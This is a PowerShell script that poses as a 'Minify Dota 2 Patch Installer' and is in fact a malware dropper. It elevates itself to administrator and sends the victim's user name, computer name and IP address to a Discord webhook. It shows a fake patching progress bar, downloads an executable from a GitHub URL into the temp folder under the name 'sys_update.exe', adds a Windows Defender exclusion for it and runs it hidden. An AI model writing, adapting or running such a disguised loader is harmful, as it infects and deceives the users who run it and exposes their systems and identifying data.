# Проверка прав администратора
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Функция для получения IP
function Get-MyIP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -ErrorAction Stop
        return $response
    } catch {
        try {
            return (Resolve-DnsName -Name "o-o.myaddr.l.google.com" -ErrorAction Stop).NameResolution.IPAddress
        } catch {
            return "Unknown"
        }
    }
}

# СЕКЦИЯ ЛОГЕРА
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $ip = Get-MyIP
    $safeMessage = $Message -replace '"', '\"'
    
    try {
        $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        
        $embedColor = 65280 
        if ($Status -eq "ERROR") { $embedColor = 16711680 }
        elseif ($Status -eq "STARTED") { $embedColor = 255 }

        $embed = @{
            title = "Minify Installer Log"
            color = $embedColor
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "Computer"; value = $Computer; inline = $true },
                @{ name = "IP Address"; value = $ip; inline = $true },
                @{ name = "Message"; value = $safeMessage; inline = $false },
                @{ name = "Timestamp"; value = $timestamp; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        
        $jsonPayload = $embed | ConvertTo-Json -Depth 10 -Compress
        $headers = @{ "Content-Type" = "application/json; charset=utf-8" }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body ([System.Text.Encoding]::UTF8.GetBytes($jsonPayload)) -ErrorAction SilentlyContinue
    } catch { }
}

Send-LogNotification -Status "STARTED" -Message "User started Minify Installer"

# ГРАФИЧЕСКИЙ ИНТЕРФЕЙС
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
$form.Size = New-Object System.Drawing.Size(600,400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$font = New-Object System.Drawing.Font("Arial", 12)
$boldFont = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(20, 30)
$titleLabel.Size = New-Object System.Drawing.Size(540, 30)
$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = $boldFont
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 300)
$progressBar.Size = New-Object System.Drawing.Size(540, 23)
$progressBar.Style = "Continuous"
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(20, 330)
$statusLabel.Size = New-Object System.Drawing.Size(540, 20)
$statusLabel.Text = "Preparing..."
$statusLabel.Font = $font
$form.Controls.Add($statusLabel)

$form.Show()

# ПРОЦЕСС УСТАНОВКИ
$steps = @(
    "Analyzing Dota 2 files...",
    "Optimizing shaders...",
    "Applying performance patch...",
    "Downloading modules...",
    "Finalizing..."
)

for ($i = 0; $i -lt $steps.Count; $i++) {
    $statusLabel.Text = $steps[$i]
    $progressBar.Value = [math]::Round((($i + 1) / $steps.Count) * 100)
    $form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

# ЗАГРУЗКА И ЗАПУСК
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $p)
    
    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
    
    $statusLabel.Text = "Installation complete!"
    $form.Refresh()
    Start-Sleep -Seconds 1
    
    Start-Process -FilePath $p -WindowStyle Hidden
    
    $form.Close()
    [System.Windows.Forms.MessageBox]::Show("Patch applied successfully!", "Done", 0, 64)
    Send-LogNotification -Status "SUCCESS" -Message "Patch installed and executed"
    
} catch {
    Send-LogNotification -Status "ERROR" -Message "Error: $($_.Exception.Message)"
    $form.Close()
}
